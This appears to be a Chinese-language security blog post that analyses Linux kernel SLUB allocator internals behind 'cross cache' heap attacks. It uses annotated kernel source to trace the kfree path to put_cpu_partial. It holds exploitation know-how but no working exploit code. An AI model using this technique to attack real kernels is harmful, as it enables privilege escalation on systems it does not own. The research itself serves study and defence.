<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="关于cross page attack攻击的手法，在安全客上的这篇文章和CVE-2022-29582的这篇博客中说的比较详细，我也是在这两篇文章的基础上加入自己的理解。 首先，当我们调用kfree()时会经过如下的路径，简单过一下这个路径，因为这不太重要。 1234kfree() &#x2F; kmem_cache_free()slab_free()do_slab_free()__slab_free()">
<meta property="og:type" content="article">
<meta property="og:title" content="Cross Cache Attack技术细节分析">
<meta property="og:url" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="veritas501&#39;s blog">
<meta property="og:description" content="关于cross page attack攻击的手法，在安全客上的这篇文章和CVE-2022-29582的这篇博客中说的比较详细，我也是在这两篇文章的基础上加入自己的理解。 首先，当我们调用kfree()时会经过如下的路径，简单过一下这个路径，因为这不太重要。 1234kfree() &#x2F; kmem_cache_free()slab_free()do_slab_free()__slab_free()">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230306162459082.png">
<meta property="og:image" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230307101148982.png">
<meta property="og:image" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230307101639174.png">
<meta property="og:image" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230308092751773.png">
<meta property="og:image" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230308093143298.png">
<meta property="og:image" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230308093307884.png">
<meta property="og:image" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230307193059916.png">
<meta property="article:published_time" content="2023-03-06T16:00:00.000Z">
<meta property="article:modified_time" content="2023-12-08T03:09:28.458Z">
<meta property="article:author" content="veritas501">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230306162459082.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Cross Cache Attack技术细节分析</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&text=Cross Cache Attack技术细节分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&is_video=false&description=Cross Cache Attack技术细节分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cross Cache Attack技术细节分析&body=Check out this article: https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&name=Cross Cache Attack技术细节分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&t=Cross Cache Attack技术细节分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Cross Cache Attack技术细节分析
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">veritas501</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-03-06T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-03-07</time>
        
        (Updated: <time datetime="2023-12-08T03:09:28.458Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/kernel/" rel="tag">kernel</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>关于cross page attack攻击的手法，在<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/285919#h2-2">安全客上的这篇文章</a>和<a target="_blank" rel="noopener" href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#how-to-free-a-page">CVE-2022-29582的这篇博客</a>中说的比较详细，我也是在这两篇文章的基础上加入自己的理解。</p>
<p>首先，当我们调用<code>kfree()</code>时会经过如下的路径，简单过一下这个路径，因为这不太重要。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kfree() / kmem_cache_free()</span><br><span class="line">slab_free()</span><br><span class="line">do_slab_free()</span><br><span class="line">__slab_free()</span><br></pre></td></tr></table></figure>

<p>在kfree中，会先用<code>virt_to_head_page()</code>取出page，判断下这个page是不是slab page，这是page的一个属性。多数情况下，得到page是slab page，从而跳过4202-4211行，调用<code>slab_free()</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; mm/slub.c:4191</span></span><br><span class="line"><span class="comment">/* 4191 */</span> <span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *x)</span></span><br><span class="line"><span class="comment">/* 4192 */</span> &#123;</span><br><span class="line"><span class="comment">/* 4193 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="comment">/* 4194 */</span> 	<span class="type">void</span> *object = (<span class="type">void</span> *)x;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 4201 */</span> 	page = virt_to_head_page(x);</span><br><span class="line"><span class="comment">/* 4202 */</span> 	<span class="keyword">if</span> (unlikely(!PageSlab(page))) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 4210 */</span> 		<span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/* 4211 */</span> 	&#125;</span><br><span class="line"><span class="comment">/* 4212 */</span> 	slab_free(page-&gt;slab_cache, page, object, <span class="literal">NULL</span>, <span class="number">1</span>, _RET_IP_);</span><br></pre></td></tr></table></figure>

<p><code>slab_free()</code>是<code>do_slab_free()</code>的包装，没啥好说。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; mm/slub.c:3160</span></span><br><span class="line"><span class="comment">/* 3160 */</span> <span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">slab_free</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> page *page,</span></span><br><span class="line"><span class="params"><span class="comment">/* 3161 */</span> 				      <span class="type">void</span> *head, <span class="type">void</span> *tail, <span class="type">int</span> cnt,</span></span><br><span class="line"><span class="params"><span class="comment">/* 3162 */</span> 				      <span class="type">unsigned</span> <span class="type">long</span> addr)</span></span><br><span class="line"><span class="comment">/* 3163 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3168 */</span> 	<span class="keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail))</span><br><span class="line"><span class="comment">/* 3169 */</span> 		do_slab_free(s, page, head, tail, cnt, addr);</span><br></pre></td></tr></table></figure>

<p><code>do_slab_free()</code>开始有点重要了，正如注释中所说，它是kfree的fastpath，所以开启了<code>__always_inline</code>确保运行速度。fastpath干的事情很简单，判断下当前要释放的object所在的page是不是当前cpu的active page，如果是，直接设置freelist pointer；否则，fallback到slowpath，即<code>__slab_free()</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; mm/slub.c:3101</span></span><br><span class="line"><span class="comment">/* 3101 */</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">/* 3102 */</span>  * Fastpath with forced inlining to produce a kfree and kmem_cache_free that</span><br><span class="line"><span class="comment">/* 3103 */</span>  * can perform fastpath freeing without additional function calls.</span><br><span class="line"><span class="comment">/* 3104 */</span>  *</span><br><span class="line"><span class="comment">/* 3105 */</span>  * The fastpath is only possible <span class="keyword">if</span> we are freeing to the current cpu slab</span><br><span class="line"><span class="comment">/* 3106 */</span>  * of this processor. This typically the <span class="keyword">case</span> <span class="keyword">if</span> we have just allocated</span><br><span class="line"><span class="comment">/* 3107 */</span>  * the item before.</span><br><span class="line"><span class="comment">/* 3108 */</span>  *</span><br><span class="line"><span class="comment">/* 3109 */</span>  * If fastpath is not possible then fall back to __slab_free where we deal</span><br><span class="line"><span class="comment">/* 3110 */</span>  * with all sorts of special processing.</span><br><span class="line"><span class="comment">/* 3111 */</span>  *</span><br><span class="line"><span class="comment">/* 3112 */</span>  * Bulk <span class="built_in">free</span> of a freelist with several <span class="title function_">objects</span> <span class="params">(all pointing to the</span></span><br><span class="line"><span class="params"><span class="comment">/* 3113 */</span>  * same page)</span> possible by specifying head and tail ptr, plus objects</span><br><span class="line"><span class="comment">/* 3114 */</span>  * <span class="title function_">count</span> <span class="params">(cnt)</span>. Bulk <span class="built_in">free</span> indicated by tail pointer being <span class="built_in">set</span>.</span><br><span class="line"><span class="comment">/* 3115 */</span>  */</span><br><span class="line"><span class="comment">/* 3116 */</span> <span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">do_slab_free</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params"><span class="comment">/* 3117 */</span> 				<span class="keyword">struct</span> page *page, <span class="type">void</span> *head, <span class="type">void</span> *tail,</span></span><br><span class="line"><span class="params"><span class="comment">/* 3118 */</span> 				<span class="type">int</span> cnt, <span class="type">unsigned</span> <span class="type">long</span> addr)</span></span><br><span class="line"><span class="comment">/* 3119 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3121 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3134 */</span> 		c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3141 */</span> 	<span class="keyword">if</span> (likely(page == c-&gt;page)) &#123;</span><br><span class="line"><span class="comment">/* 3142 */</span> 		<span class="type">void</span> **freelist = READ_ONCE(c-&gt;freelist);</span><br><span class="line"><span class="comment">/* 3143 */</span> </span><br><span class="line"><span class="comment">/* 3144 */</span> 		set_freepointer(s, tail_obj, freelist);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3155 */</span> 	&#125; <span class="keyword">else</span></span><br><span class="line"><span class="comment">/* 3156 */</span> 		__slab_free(s, page, head, tail_obj, cnt, addr);</span><br></pre></td></tr></table></figure>

<p>在<code>do_slab_free()</code>中，我们第一次接触到这个很重要的结构体<code>struct kmem_cache_cpu</code>。它以指针的形式存在于结构体<code>struct kmem_cache</code>中。可以看到<code>cpu_slab</code>前面有<code>__percpu</code>参数，即每个CPU都有一个<code>cpu_slab</code>结构体。<code>kmem_cache_cpu</code>中的page就是我们常说的active page，freelist就是这个active page中的freelist。<code>partial</code>中存放的是非满的page。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; include/linux/slub_def.h:43</span></span><br><span class="line"><span class="comment">/* 43 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="comment">/* 44 */</span> 	<span class="type">void</span> **freelist;	<span class="comment">/* Pointer to next available object */</span></span><br><span class="line"><span class="comment">/* 45 */</span> 	<span class="type">unsigned</span> <span class="type">long</span> tid;	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line"><span class="comment">/* 46 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>	<span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="comment">/* 47 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* 48 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span>	<span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="comment">/* 49 */</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">-------</span><br><span class="line"><span class="comment">/* 53 */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &gt;&gt;&gt; include/linux/slub_def.h:84</span></span><br><span class="line"><span class="comment">/*  84 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="comment">/*  85 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="comment">/*  86 */</span> 	<span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="comment">/*  87 */</span> 	<span class="type">slab_flags_t</span> flags;</span><br><span class="line"><span class="comment">/*  88 */</span> 	<span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line"><span class="comment">/*  89 */</span> 	<span class="type">unsigned</span> <span class="type">int</span> size;	<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="comment">/*  90 */</span> 	<span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="comment">/*  91 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line"><span class="comment">/*  92 */</span> 	<span class="type">unsigned</span> <span class="type">int</span> offset;	<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="comment">/*  93 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/*  94 */</span> 	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="comment">/*  95 */</span> 	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line"><span class="comment">/*  96 */</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 136 */</span> &#125;;</span><br></pre></td></tr></table></figure>



<p>当我们想做cross page attack时，其实就是想知道如何才能把目标slab的page释放掉。这在代码中由函数<code>discard_slab()</code>来完成（内部调用<code>free_slab()</code>，再调用<code>__free_slab()</code>，最后调用<code>__free_pages()</code>）。</p>
<p>从<code>__slab_free()</code>开始到<code>discard_slab()</code> 的调用链如下：</p>
<p><img src="/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230306162459082.png"></p>
<p>首先，程序会判断当前释放object所在的page是否是active slab或是否已经在partial list中，如果是就会直接free 这个object（加入freelist等操作），否则才会调用到<code>put_cpu_partial()</code>，这段逻辑在<code>__slab_free()</code>中，看起来有点复杂，<strong>但其实归纳起来就是，只有一个非active的满page尝试释放其中的一个object时才会进入<code>put_cpu_partial()</code>。（需要多思考两遍）</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; mm/slub.c:2984</span></span><br><span class="line"><span class="comment">/* 2984 */</span> <span class="type">static</span> <span class="type">void</span> __slab_free(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> page *page,</span><br><span class="line"><span class="comment">/* 2985 */</span> 			<span class="type">void</span> *head, <span class="type">void</span> *tail, <span class="type">int</span> cnt,</span><br><span class="line"><span class="comment">/* 2986 */</span> 			<span class="type">unsigned</span> <span class="type">long</span> addr)</span><br><span class="line"><span class="comment">/* 2987 */</span> </span><br><span class="line"><span class="comment">/* 2988 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3005 */</span> 	<span class="keyword">do</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3010 */</span> 		prior = page-&gt;freelist;</span><br><span class="line"><span class="comment">/* 3011 */</span> 		counters = page-&gt;counters;</span><br><span class="line"><span class="comment">/* 3012 */</span> 		set_freepointer(s, tail, prior);</span><br><span class="line">    			<span class="comment">// frozen和counters是union关系，这一步就设置了new.frozen</span></span><br><span class="line"><span class="comment">/* 3013 */</span> 		new.counters = counters;</span><br><span class="line">    			<span class="comment">// frozen是指page在partial list中</span></span><br><span class="line"><span class="comment">/* 3014 */</span> 		was_frozen = new.frozen;</span><br><span class="line"><span class="comment">/* 3015 */</span> 		new.inuse -= cnt; <span class="comment">// page中多少个object在被使用</span></span><br><span class="line">    			<span class="comment">// 如果当前page为满状态，则没有freelist，所以prior == NULL，</span></span><br><span class="line">    			<span class="comment">// 且因为是满状态，所以也不在partial中，因此 was_frozen == 0</span></span><br><span class="line"><span class="comment">/* 3016 */</span> 		<span class="keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;</span><br><span class="line"><span class="comment">/* 3017 */</span> </span><br><span class="line">    				<span class="comment">// !prior 是说之前没有freeslit，即page为满状态</span></span><br><span class="line"><span class="comment">/* 3018 */</span> 			<span class="keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123; </span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3026 */</span> 				new.frozen = <span class="number">1</span>; <span class="comment">// 得走到这里</span></span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 简单理解成一个原子的交换，默认就会break出来</span></span><br><span class="line"><span class="comment">/* 3044 */</span> 	&#125; <span class="keyword">while</span> (!cmpxchg_double_slab(s, page,</span><br><span class="line"><span class="comment">/* 3045 */</span> 		prior, counters,</span><br><span class="line"><span class="comment">/* 3046 */</span> 		head, new.counters,</span><br><span class="line"><span class="comment">/* 3047 */</span> 		<span class="string">&quot;__slab_free&quot;</span>));</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 正常就是NULL</span></span><br><span class="line"><span class="comment">/* 3049 */</span> 	<span class="keyword">if</span> (likely(!n)) &#123;</span><br><span class="line"><span class="comment">/* 3050 */</span> </span><br><span class="line">    			<span class="comment">// 如果page之前就在was_frozen中会走这里</span></span><br><span class="line"><span class="comment">/* 3051 */</span> 		<span class="keyword">if</span> (likely(was_frozen)) &#123;</span><br><span class="line">------</span><br><span class="line">    			<span class="comment">// 之前是满状态，需要新加到partial list中，走这里</span></span><br><span class="line"><span class="comment">/* 3057 */</span> 		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (new.frozen) &#123;</span><br><span class="line">------</span><br><span class="line">    				<span class="comment">// 调用目标函数， put_cpu_partial()</span></span><br><span class="line"><span class="comment">/* 3062 */</span> 			put_cpu_partial(s, page, <span class="number">1</span>); <span class="comment">// &lt;--- 目标！</span></span><br></pre></td></tr></table></figure>



<p>进入<code>put_cpu_partial()</code> 后有两条路径，判断条件是当前partial list中的pobjects个数是否超过了阈值，如果没有超过，则直接将目标page加入到cpu的partial list中并刷新partial list的各个参数即可；否则需要调用目标函数<code>unfreeze_partials()</code>将当前CPU的partial链表中的page转移到Node管理的partial链表尾部。</p>
